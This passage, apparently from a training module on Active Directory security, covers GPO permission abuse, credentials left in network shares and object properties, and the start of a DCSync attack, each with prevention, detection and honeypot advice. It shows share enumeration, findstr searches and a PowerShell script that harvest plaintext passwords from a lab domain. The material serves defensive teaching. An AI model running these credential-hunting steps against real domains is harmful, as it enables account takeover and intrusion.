<li>Logon attempts (failed or successful, depending on whether the password is up to date) of the user whose credentials are exposed is another way of detecting the abuse of this attack; this should generate one of the events <code>4624</code> (<code>successful logon</code>), <code>4625</code> (<code>failed logon</code>), or <code>4768</code> (<code>TGT requested</code>). A successful logon with the account from our attack scenario would generate the following event on the Domain Controller:</li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A3/audit3.png" alt="Roasted hashes"></p>
<p>In the case of a service account, we may correlate logon attempts with the device from which the authentication attempt originates, as this should be easy to detect, assuming we know where certain accounts are used (primarily if the logon originated from a workstation, which is abnormal behavior for a service account).</p>
<hr>
<h3 id="honeypot">Honeypot</h3>
<p>This attack provides an excellent opportunity for setting up a trap: we can use a semi-privileged user with a <code>wrong password</code>. Service accounts provide a more realistic opportunity because:</p>
<ul>
<li>The password is usually expected to be old, without recent or regular modifications.</li>
<li>It is easy to ensure that the last password change is older than when the GPP XML file was last modified. If the user&#39;s password is changed after the file was modified, then no adversary will attempt to login with this account (the password is likely no longer valid).</li>
<li>Schedule the user to perform any dummy task to ensure that there are recent logon attempts.</li>
</ul>
<p>When we do the above, we can configure an alert that if any successful or failed logon attempts occur with this service account, it must be malicious (assuming that we whitelist the dummy task logon that simulates the logon activity in the alert).</p>
<p>Because the provided password is wrong, we would primarily expect failed logon attempts. Three event IDs (<code>4625</code>, <code>4771</code>, and <code>4776</code>) can indicate this; here is how they look for our playground environment if an attacker is attempting to authenticate with a wrong password:</p>
<ul>
<li><code>4625</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A3/honeypot4dot3.png" alt="Roasted hashes"></p>
<ul>
<li><code>4771</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A3/honeypot4.png" alt="Roasted hashes"></p>
<ul>
<li><code>4776</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A3/honeypot4dot2.png" alt="Roasted hashes"></p>
<h2 id="gpo-permissions-gpo-files">GPO Permissions/GPO Files</h2>
<hr>
<h3 id="description">Description</h3>
<p>A <a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-objects">Group Policy Object (GPO)</a> is a virtual collection of policy settings that has a unique name. <code>GPOs</code> are the most widely used configuration management tool in Active Directory. Each GPO contains a collection of zero or more policy settings. They are linked to an <code>Organizational Unit</code> in the AD structure for their settings to be applied to objects that reside in the OU or any child OU of the one to which the GPO is linked. GPOs can be restricted to which objects they apply by specifying, for example, an AD group (by default, it applies to Authenticated Users) or a WMI filter (e.g., apply only to Windows 10 machines).</p>
<p>When we create a new GPO, only Domain admins (and similar privileged roles) can modify it. However, within environments, we will encounter different delegations that allow less privileged accounts to perform edits on the GPOs; this is where the problem lies. Many organizations have GPOs that can modify &#39;Authenticated Users&#39; or &#39;Domain Users&#39;, which entails that any compromised user will allow the attacker to alter these GPOs. Modifications can include additions of start-up scripts or a scheduled task to execute a file, for example. This access will allow an adversary to compromise all computer objects in the OUs that the vulnerable GPOs are linked to.</p>
<p>Similarly, administrators perform software installation via GPOs or configure start-up scripts located on network shares. If the network share is misconfigured, an adversary may be able to replace the file to be executed by the system with a malicious one. The GPO may have no misconfigurations in these scenarios, just misconfigured NTFS permissions on the files deployed.</p>
<hr>
<h3 id="attack">Attack</h3>
<p>No attack walkthrough is available here - it is a simple GPO edit or file replacement.</p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>One way to prevent this attack is to lock down the GPO permissions to be modified by a particular group of users only or by a specific account, as this will significantly limit the ability of who can edit the GPO or change its permissions (as opposed to everybody in Domain admins, which in some organizations can easily be more than 50). Similarly, never deploy files stored in network locations so that many users can modify the share permissions.</p>
<p>We should also review the permissions of GPOs actively and regularly, with the option of automating a task that runs hourly and alerts if any deviations from the expected permissions are detected.</p>
<hr>
<h3 id="detection">Detection</h3>
<p>Fortunately, it is straightforward to detect when a GPO is modified. If Directory Service Changes auditing is enabled, then the event ID <code>5136</code> will be generated:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A4/GPO-modified.png" alt="Roasted hashes"></p>
<p>From a defensive point of view, if a user who is <code>not</code> expected to have the right to modify a GPO suddenly appears here, then a red flag should be raised.</p>
<hr>
<h3 id="honeypot">Honeypot</h3>
<p>A common thought is that because of the easy detection methods of these attacks, it is worth having a misconfigured GPO in the environment for threat agents to abuse; this is also true for a deployed file as they can be continuously monitored for any change to the file (e.g., constantly checking if the hash value of the file has not changed). However, implementing these techniques is only recommended if an organization is mature and proactive in responding to high/critical vulnerabilities; this is because if, in the future, an escalation path is discovered via some GPO modification, unless it is possible to mitigate it in real-time, the <code>trap</code> backfires to become the weakest point.</p>
<p>However, when implementing a honeypot using a misconfigured GPO, consider the following:</p>
<ul>
<li>GPO is linked to non-critical servers only.</li>
<li>Continuous automation is in place for monitoring modifications of GPO. - - If the GPO file is modified, we will disable the user performing the modification immediately.</li>
<li>The GPO should be automatically unlinked from all locations if a modification is detected.</li>
</ul>
<p>Consider the following script to demonstrate how PowerShell can automate this. In our case, the honeypot GPO is identified by a GUID value, and the action desired is to disable the account(s) associated with this change. The reason for potentially multiple accounts is that we will execute the script every 15 minutes as a scheduled task. So, if numerous compromised users were used to modify the GPO in this time frame, we will disable them all instantly. The script has a commented-out section that can be used for sending an email as an alert, but for a PoC, we will display the output on the command line:</p>
<p>Code: powershell</p>
<pre><code class="lang-powershell"><span class="hljs-comment"># Define filter for the last 15 minutes</span>
<span class="hljs-variable">$TimeSpan</span> = (<span class="hljs-built_in">Get-Date</span>) - (<span class="hljs-built_in">New-TimeSpan</span> -Minutes <span class="hljs-number">15</span>)

<span class="hljs-comment"># Search for event ID 5136 (GPO modified) in the past 15 minutes</span>
<span class="hljs-variable">$Logs</span> = <span class="hljs-built_in">Get-WinEvent</span> -FilterHashtable @{LogName=<span class="hljs-string">'Security'</span>;id=<span class="hljs-number">5136</span>;StartTime=<span class="hljs-variable">$TimeSpan</span>} -ErrorAction SilentlyContinue |`
<span class="hljs-built_in">Where-Object</span> {<span class="hljs-variable">$_</span>.Properties[<span class="hljs-number">8</span>].Value <span class="hljs-nomarkup">-match</span> <span class="hljs-string">"CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"</span>}


<span class="hljs-keyword">if</span>(<span class="hljs-variable">$Logs</span>){
    <span class="hljs-variable">$emailBody</span> = <span class="hljs-string">"Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n"</span>
    <span class="hljs-variable">$disabledUsers</span> = @()
    <span class="hljs-keyword">ForEach</span>(<span class="hljs-variable">$log</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$logs</span>){
        <span class="hljs-keyword">If</span>(((Get-ADUser -identity <span class="hljs-variable">$log</span>.Properties[<span class="hljs-number">3</span>].Value).Enabled <span class="hljs-nomarkup">-eq</span> <span class="hljs-literal">$true</span>) -and (<span class="hljs-variable">$log</span>.Properties[<span class="hljs-number">3</span>].Value <span class="hljs-nomarkup">-notin</span> <span class="hljs-variable">$disabledUsers</span>)){
            Disable-ADAccount -Identity <span class="hljs-variable">$log</span>.Properties[<span class="hljs-number">3</span>].Value
            <span class="hljs-variable">$emailBody</span> = <span class="hljs-variable">$emailBody</span> + <span class="hljs-string">"Disabled user "</span> + <span class="hljs-variable">$log</span>.Properties[<span class="hljs-number">3</span>].Value + <span class="hljs-string">"`r`n"</span>
            <span class="hljs-variable">$disabledUsers</span> += <span class="hljs-variable">$log</span>.Properties[<span class="hljs-number">3</span>].Value
        }
    }
    <span class="hljs-comment"># Send an alert via email - complete the command below</span>
    <span class="hljs-comment"># Send-MailMessage</span>
    <span class="hljs-variable">$emailBody</span>
}
</code></pre>
<p>We will see the following output (or email body if configured) if the script detects that the honeypot GPO was modified:</p>
<p>GPO Permissions/GPO Files</p>
<pre><code class="lang-powershell-session">PS C:\scripts&gt; <span class="hljs-comment"># Define filter for the last 15 minutes</span>
<span class="hljs-variable">$TimeSpan</span> = (<span class="hljs-built_in">Get-Date</span>) - (<span class="hljs-built_in">New-TimeSpan</span> -Minutes <span class="hljs-number">15</span>)

<span class="hljs-comment"># Search for event ID 5136 (GPO modified) in the past 15 minutes</span>
<span class="hljs-variable">$Logs</span> = <span class="hljs-built_in">Get-WinEvent</span> -FilterHashtable @{LogName=<span class="hljs-string">'Security'</span>;id=<span class="hljs-number">5136</span>;StartTime=<span class="hljs-variable">$TimeSpan</span>} -ErrorAction SilentlyContinue |`
<span class="hljs-built_in">Where-Object</span> {<span class="hljs-variable">$_</span>.Properties[<span class="hljs-number">8</span>].Value <span class="hljs-nomarkup">-match</span> <span class="hljs-string">"CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"</span>}


<span class="hljs-keyword">if</span>(<span class="hljs-variable">$Logs</span>){
    <span class="hljs-variable">$emailBody</span> = <span class="hljs-string">"Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n"</span>
    <span class="hljs-variable">$disabledUsers</span> = @()
    <span class="hljs-keyword">ForEach</span>(<span class="hljs-variable">$log</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$logs</span>){
        <span class="hljs-comment"># Write-Host "User performing the modification is " $log.Properties[3].Value</span>
        <span class="hljs-keyword">If</span>(((Get-ADUser -identity <span class="hljs-variable">$log</span>.Properties[<span class="hljs-number">3</span>].Value).Enabled <span class="hljs-nomarkup">-eq</span> <span class="hljs-literal">$true</span>) -and (<span class="hljs-variable">$log</span>.Properties[<span class="hljs-number">3</span>].Value <span class="hljs-nomarkup">-notin</span> <span class="hljs-variable">$disabledUsers</span>)){
            Disable-ADAccount -Identity <span class="hljs-variable">$log</span>.Properties[<span class="hljs-number">3</span>].Value
            <span class="hljs-variable">$emailBody</span> = <span class="hljs-variable">$emailBody</span> + <span class="hljs-string">"Disabled user "</span> + <span class="hljs-variable">$log</span>.Properties[<span class="hljs-number">3</span>].Value + <span class="hljs-string">"`r`n"</span>
            <span class="hljs-variable">$disabledUsers</span> += <span class="hljs-variable">$log</span>.Properties[<span class="hljs-number">3</span>].Value
        }
    }
    <span class="hljs-comment"># Send an alert via email</span>
    <span class="hljs-comment"># Send-MailMessage</span>
    <span class="hljs-variable">$emailBody</span>
}

Honeypot GPO <span class="hljs-string">'73C66DBB-81DA-44D8-BDEF-20BA2C27056D'</span> was modified
Disabled user bob


PS C:\scripts&gt;
</code></pre>
<p>As we can see above, the user <code>bob</code> was detected modifying our honeypot GPO and is, therefore, disabled. Disabling the user will then create an event with ID <code>4725</code>:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A4/userDisabled.png" alt="Roasted hashes"></p>
<h2 id="credentials-in-shares">Credentials in Shares</h2>
<hr>
<h3 id="description">Description</h3>
<p>Credentials exposed in network shares are (probably) the most encountered misconfiguration in Active Directory to date. Any medium/large enterprises will undoubtedly have exposed credentials, although it may also happen in small businesses. It almost feels like we are moving from &quot;Don&#39;t leave your password on a post-it note on your screen&quot; to &quot;Don&#39;t leave unencrypted credentials and authorization tokens scattered everywhere&quot;.</p>
<p>We often find credentials in network shares within scripts and configuration files (batch, cmd, PowerShell, conf, ini, and config). In contrast, credentials on a user&#39;s local machine primarily reside in text files, Excel sheets, or Word documents. The main difference between the storage of credentials on shares and machines is that the former poses a significantly higher risk, as it may be accessible by every user. A network share may be accessible by every user for four main reasons:</p>
<ul>
<li>One admin user initially creates the shares with properly locked down access but ultimately opens it to everyone. Another admin of the server could also be the culprit. Nonetheless, the share eventually becomes open to <code>Everyone</code> or <code>Users,</code> and recall that a server&#39;s <code>Users</code> group contains <code>Domain users</code> as its member in Active Directory environments. Therefore every domain user will have at least read access (it is wrongly assumed that adding &#39;Users&#39; will give access to only those local to the server or Administrators).</li>
<li>The administrator adding scripts with credentials to a share is unaware it is a shared folder. Many admins test their scripts in a <code>scripts</code> folder in the <code>C:\</code> drive; however, if the folder is shared (for example, with <code>Users</code>), then the data within the scripts is also exposed on the network.</li>
<li>Another example is purposely creating an open share to move data to a server (for example, an application or some other files) and forgetting to close it later.</li>
<li>Finally, in the case of hidden shares (folders whose name ends with a dollar sign <code>$</code>), there is a misconception that users cannot find the folder unless they know where it exists; the misunderstanding comes from the fact that <code>Explorer</code> in Windows does not display files or folders whose name end with a <code>$</code>, however, any other tool will show it.</li>
</ul>
<hr>
<h3 id="attack">Attack</h3>
<p>The first step is identifying what shares exist in a domain. There are plenty of tools available that can achieve this, such as PowerView&#39;s <a href="https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1">Invoke-ShareFinder</a>. This function allows specifying that default shares should be filtered out (such as <code>c$</code> and <code>IPC$</code>) and also check if the invoking user has access to the rest of the shares it finds. The final output contains a list of non-default shares that the current user account has at least read access to:</p>
<p>Credentials in Shares</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; Invoke-ShareFinder -domain eagle<span class="hljs-selector-class">.local</span> -ExcludeStandard -CheckShareAccess

\\DC2<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\NETLOGON      - Logon server share
\\DC2<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\SYSVOL        - Logon server share
\\WS001<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\Share       -
\\WS001<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\Users       -
\\Server01<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\dev$     -
\\DC1<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\NETLOGON      - Logon server share
\\DC1<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\SYSVOL        - Logon server share
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/sharescan.png" alt="invoke-sharefinder"></p>
<p>The playground environment has few shares in the domain, however, in production environments, the number can reach thousands (which requires long periods to parse).</p>
<p>The image above shows a share with the name <code>dev$</code>. Because of the dollar sign, if we were to browse the server which contains the share using Windows Explorer, we would be presented with an empty list (shares such as <code>C$</code> and <code>IPC$</code> even though available by default, Explorer does not display them because of the dollar sign):</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/sharefileless.png" alt="invoke-sharefinder"></p>
<p>However, since we have the <code>UNC</code> path from the output, if we browse to it, we will be able to see the contents inside the share:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/sharecontent.png" alt="invoke-sharefinder"></p>
<p>A few automated tools exist, such as <a href="https://github.com/vivami/SauronEye">SauronEye</a>, which can parse a collection of files and pick up matching words. However, because there are few shares in the playground, we will take a more manual approach (<code>Living Off the Land</code>) and use the built-in command <code>findstr</code> for this attack. When running <code>findstr</code>, we will specify the following arguments:</p>
<ul>
<li><code>/s</code> forces to search the current directory and all subdirectories</li>
<li><code>/i</code> ignores case in the search term</li>
<li><code>/m</code> shows only the filename for a file that matches the term. We highly need this in real production environments because of the huge amounts of text that get returned. For example, this can be thousands of lines in PowerShell scripts that contain the <code>PassThru</code> parameter when matching for the string <code>pass</code>.</li>
<li>The <code>term</code> that defines what we are looking for. Good candidates include <code>pass</code>, <code>pw</code>, and the <code>NETBIOS</code> name of the domain. In the playground environment, it is <code>eagle</code>. Attractive targets for this search would be file types such as <code>.bat</code>, <code>.cmd</code>, <code>.ps1</code>, <code>.conf</code>, <code>.config</code>, and <code>.ini</code>. Here&#39;s how <code>findstr</code> can be executed to display the path of the files with a match that contains <code>pass</code> relative to the current location:</li>
</ul>
<p>Credentials in Shares</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; cd \\Server01<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\dev$
PS Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Core</span>\FileSystem::\\Server01<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\dev$&gt; findstr /m /s /<span class="hljs-selector-tag">i</span> <span class="hljs-string">"pass"</span> *<span class="hljs-selector-class">.bat</span>
PS Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Core</span>\FileSystem::\\Server01<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\dev$&gt; findstr /m /s /<span class="hljs-selector-tag">i</span> <span class="hljs-string">"pass"</span> *<span class="hljs-selector-class">.cmd</span>
PS Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Core</span>\FileSystem::\\Server01<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\dev$&gt; findstr /m /s /<span class="hljs-selector-tag">i</span> <span class="hljs-string">"pass"</span> *<span class="hljs-selector-class">.ini</span>
setup<span class="hljs-selector-class">.ini</span>
PS Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Core</span>\FileSystem::\\Server01<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\dev$&gt; findstr /m /s /<span class="hljs-selector-tag">i</span> <span class="hljs-string">"pass"</span> *<span class="hljs-selector-class">.config</span>
<span class="hljs-number">4</span>\<span class="hljs-number">5</span>\<span class="hljs-number">4</span>\web.config
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/scan1.png" alt="invoke-sharefinder"></p>
<p>Similarly, we can execute <code>findstr</code> by looking for <code>pw</code> as the search term. Note that if we remove the `/m&#39; argument, it will display the exact line in the file where the match occurred:</p>
<p>Credentials in Shares</p>
<pre><code class="lang-powershell-session">PS Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Core</span>\FileSystem::\\Server01<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\dev$&gt; findstr /m /s /<span class="hljs-selector-tag">i</span> <span class="hljs-string">"pw"</span> *<span class="hljs-selector-class">.config</span>

<span class="hljs-number">5</span>\<span class="hljs-number">2</span>\<span class="hljs-number">3</span>\microsoft<span class="hljs-selector-class">.config</span>
PS Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Core</span>\FileSystem::\\Server01<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\dev$&gt; findstr /s /<span class="hljs-selector-tag">i</span> <span class="hljs-string">"pw"</span> *<span class="hljs-selector-class">.config</span>
<span class="hljs-number">5</span>\<span class="hljs-number">2</span>\<span class="hljs-number">3</span>\microsoft<span class="hljs-selector-class">.config</span>:pw BANANANANANANANANANANANANNAANANANANAS
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/scan2.png" alt="invoke-sharefinder"></p>
<p>One obvious and yet uncommon search term is the <code>NetBIOS</code> name of the domain. Commands such as <code>runas</code> and <code>net</code> take passwords as a positional argument on the command line instead of passing them via <code>pass</code>, <code>pw</code>, or any other term. It is usually defined as <code>/user:DOMAIN\USERNAME PASSWORD</code>. Here&#39;s the search executed in the playground domain:</p>
<p>Credentials in Shares</p>
<pre><code class="lang-powershell-session">PS Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Core</span>\FileSystem::\\Server01<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\dev$&gt; findstr /m /s /<span class="hljs-selector-tag">i</span> <span class="hljs-string">"eagle"</span> *<span class="hljs-selector-class">.ps1</span>

<span class="hljs-number">2</span>\<span class="hljs-number">4</span>\<span class="hljs-number">4</span>\Software\connect<span class="hljs-selector-class">.ps1</span>
PS Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Core</span>\FileSystem::\\Server01<span class="hljs-selector-class">.eagle</span><span class="hljs-selector-class">.local</span>\dev$&gt; findstr /s /<span class="hljs-selector-tag">i</span> <span class="hljs-string">"eagle"</span> *<span class="hljs-selector-class">.ps1</span>
<span class="hljs-number">2</span>\<span class="hljs-number">4</span>\<span class="hljs-number">4</span>\Software\connect<span class="hljs-selector-class">.ps1</span>:net use E: \\DC1\sharedScripts /user:eagle\Administrator Slavi123
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/scan3.png" alt="invoke-sharefinder"></p>
<p>The last command reads the text file and displays its content, including the credentials; this would be the domain&#39;s built-in account credentials (not uncommon to find domain admin rights in these script files).</p>
<p>Note that running <code>findstr</code> with the same arguments is recently picked up by <code>Windows Defender</code> as suspicious behavior.</p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>The best practice to prevent these attacks is to lock down every share in the domain so there are no loose permissions.</p>
<p>Technically, there is no way to prevent what users leave behind them in scripts or other exposed files, so performing regular scans (e.g., weekly) on AD environments to identify any new open shares or credentials exposed in older ones is necessary.</p>
<hr>
<h3 id="detection">Detection</h3>
<p>Understanding and analyzing users&#39; behavior is the best detection technique for abusing discovered credentials in shares. Suppose we know the time and location of users&#39; login via data analysis. In that case, it will be effortless to alert on seemingly suspicious behaviors—for example, the discovered account &#39;Administrator&#39; in the attack described above. If we were a mature organization that used <code>Privileged Access Workstation</code>, we would be alert to privileged users not authenticating from those machines. These would be alerts on event IDs <code>4624</code>/<code>4625</code> (failed and successful logon) and <code>4768</code> (Kerberos TGT requested).</p>
<p>Below is an example of a successful logon with event ID <code>4624</code> for the Administrator account:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/Detect4624.png" alt="Detection Event 4624"></p>
<p>Similarly, if Kerberos were used for authentication, event ID <code>4768</code> would be generated:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/Detect4768.png" alt="Detection Event 4768"></p>
<p>Another detection technique is discovering the <code>one-to-many</code> connections, for example, when <code>Invoke-ShareFinder</code> scans every domain device to obtain a list of its network shares. It would be abnormal for a workstation to connect to 100s or even 1000s of other devices simultaneously.</p>
<hr>
<h3 id="honeypot">Honeypot</h3>
<p>This attack provides another excellent reason for leaving a honeypot user in AD environments: a semi-privileged username with a <code>wrong</code> password. An adversary can only discover this if the password was changed after the file&#39;s last modification containing this exposed fake password. Below is a good setup for the account:</p>
<ul>
<li>A <code>service account</code> that was created 2+ years ago. The last password change should be at least one year ago.</li>
<li>The last modification time of the file containing the <code>fake</code> password must be after the last password change of the account. Because it is a fake password, there is no risk of a threat agent compromising the account.</li>
<li>The account is still active in the environment.</li>
<li>The script containing the credentials should be realistic. (For example, if we choose an <code>MSSQL service account</code>, a <code>connection string</code> can expose the credentials.)</li>
</ul>
<p>Because the provided password is wrong, we would primarily expect failed logon attempts. Three event IDs (<code>4625</code>, <code>4771</code>, and <code>4776</code>) can indicate this. Here is how they look from our playground environment if an attacker is attempting to authenticate with the account <code>svc-iis</code> and a wrong password:</p>
<ul>
<li><code>4625</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/honeypot4dot3.png" alt="Honey user - Failed logon 4625"></p>
<ul>
<li><code>4771</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/honeypot4.png" alt="Honey user - Failed logon 4771"></p>
<ul>
<li><code>4776</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A5/honeypot4dot2.png" alt="Honey user - Failed logon 4776"></p>
<h2 id="credentials-in-object-properties">Credentials in Object Properties</h2>
<hr>
<h3 id="description">Description</h3>
<p>Objects in Active Directory have a plethora of different properties; for example, a <code>user</code> object can contain properties that contain information such as:</p>
<ul>
<li>Is the account active</li>
<li>When does the account expire</li>
<li>When was the last password change</li>
<li>What is the name of the account</li>
<li>Office location for the employee and phone number</li>
</ul>
<p>When administrators create accounts, they fill in those properties. A common practice in the past was to add the user&#39;s (or service account&#39;s) password in the <code>Description</code> or <code>Info</code> properties, thinking that administrative rights in AD are needed to view these properties. However, <code>every</code> domain user can read most properties of an object (including <code>Description</code> and <code>Info</code>).</p>
<hr>
<h3 id="attack">Attack</h3>
<p>A simple PowerShell script can query the entire domain by looking for specific search terms/strings in the <code>Description</code> or <code>Info</code> fields:</p>
<p>Code: powershell</p>
<pre><code class="lang-powershell"><span class="hljs-function"><span class="hljs-keyword">Function</span> <span class="hljs-title">SearchUserClearTextInformation</span>
</span>{
    Param (
        [Parameter(Mandatory=$true)]
        [<span class="hljs-keyword">Array</span>] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    <span class="hljs-keyword">if</span> ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } <span class="hljs-keyword">else</span> {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    <span class="hljs-keyword">foreach</span> ($t in $Terms)
    {
        $list += <span class="hljs-string">"(`$_.Description -like `"</span>*$t*`<span class="hljs-string">")"</span>
        $list += <span class="hljs-string">"(`$_.Info -like `"</span>*$t*`<span class="hljs-string">")"</span>
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join <span class="hljs-string">' -OR '</span>) } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
</code></pre>
<p>We will run the script to hunt for the string <code>pass</code>, to find the password <code>Slavi123</code> in the <code>Description</code> property of the user <code>bonni</code>:</p>
<p>Credentials in Object Properties</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\Users\bob\Downloads&gt; SearchUserClearTextInformation -Terms <span class="hljs-string">"pass"</span>

<span class="hljs-string">SamAccountName       :</span> bonni
<span class="hljs-string">Enabled              :</span> True
<span class="hljs-string">Description          :</span> <span class="hljs-string">pass:</span> Slavi123
<span class="hljs-string">Info                 :</span> 
<span class="hljs-string">PasswordNeverExpires :</span> True
<span class="hljs-string">PasswordLastSet      :</span> <span class="hljs-number">05</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">15.18</span><span class="hljs-number">.05</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A6/A6creds.png" alt="Creds in Description"></p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>We have many options to prevent this attack/misconfiguration:</p>
<ul>
<li><code>Perform</code> <code>continuous assessments</code> to detect the problem of storing credentials in properties of objects.</li>
<li><code>Educate</code> employees with high privileges to avoid storing credentials in properties of objects.</li>
<li><code>Automate</code> as much as possible of the user creation process to ensure that administrators don&#39;t handle the accounts manually, reducing the risk of introducing hardcoded credentials in user objects.</li>
</ul>
<hr>
<h3 id="detection">Detection</h3>
<p>Baselining users&#39; behavior is the best technique for detecting abuse of exposed credentials in properties of objects. Although this can be tricky for regular user accounts, triggering an alert for administrators/service accounts whose behavior can be understood and baselined is easier. Automated tools that monitor user behavior have shown increased success in detecting abnormal logons. In the example above, assuming that the provided credentials are up to date, we would expect events with event ID <code>4624</code>/<code>4625</code> (failed and successful logon) and <code>4768</code> (Kerberos TGT requested). Below is an example of event ID <code>4768</code>:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A6/Detect1.png" alt="Creds in Description"></p>
<p>Unfortunately, the event ID <code>4738</code> generated when a user object is modified does not show the specific property that was altered, nor does it provide the new values of properties. Therefore, we cannot use this event to detect if administrators add credentials to the properties of objects.</p>
<hr>
<h3 id="honeypot">Honeypot</h3>
<p>Storing credentials in properties of objects is an excellent honeypot technique for not-very-mature environments. If struggling with basic cyber hygiene, then it is more likely expected to have such issues (storing credentials in properties of objects) in an AD environment. For setting up a honeypot user, we need to ensure the followings:</p>
<ul>
<li>The password/credential is configured in the <code>Description</code> field, as it&#39;s the easiest to pick up by any adversary.</li>
<li>The provided password is fake/incorrect.</li>
<li>The account is enabled and has recent login attempts.</li>
<li>While we can use a regular user or a service account, service accounts are more likely to have this exposed as administrators tend to create them manually. In contrast, automated HR systems often make employee accounts (and the employees have likely changed the password already).</li>
<li>The account has the last password configured 2+ years ago (makes it more believable that the password will likely work).</li>
</ul>
<p>Because the provided password is wrong, we would primarily expect failed logon attempts; three event IDs (<code>4625</code>, <code>4771</code>, and <code>4776</code>) can indicate this. Here is how they look in our playground environment if an attacker is attempting to authenticate with the account <code>svc-iis</code> and a wrong password:</p>
<ul>
<li><code>4625</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A6/honeypot4dot3.png" alt="Honey user - Failed logon 4625"></p>
<ul>
<li><code>4771</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A6/honeypot4.png" alt="Honey user - Failed logon 4771"></p>
<ul>
<li><code>4776</code></li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A6/honeypot4dot2.png" alt="Honey user - Failed logon 4776"></p>
<h2 id="dcsync">DCSync</h2>
<hr>
<h3 id="description">Description</h3>
<p><code>DCSync</code> is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:</p>
<ul>
<li><code>Replicating Directory Changes</code></li>
<li><code>Replicating Directory Changes All</code></li>
</ul>
<hr>
<h3 id="attack">Attack</h3>
<p>We will utilize the user <code>Rocky</code> (whose password is <code>Slavi123</code>) to showcase the <code>DCSync</code> attack. When we check the permissions for Rocky, we see that he has <code>Replicating Directory Changes</code> and <code>Replicating Directory Changes All</code> assigned:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A7/DCPermission.png" alt="Creds in Description"></p>
<p>First, we need to start a new command shell running as Rocky:</p>
<p>DCSync</p>
<pre><code class="lang-cmd-session">C:\Users\bob\Downloads&gt;runas /<span class="hljs-keyword">user</span>:eagle\rocky <span class="hljs-keyword">cmd</span>.<span class="bash">exe
</span>
Enter the password for eagle\rocky:
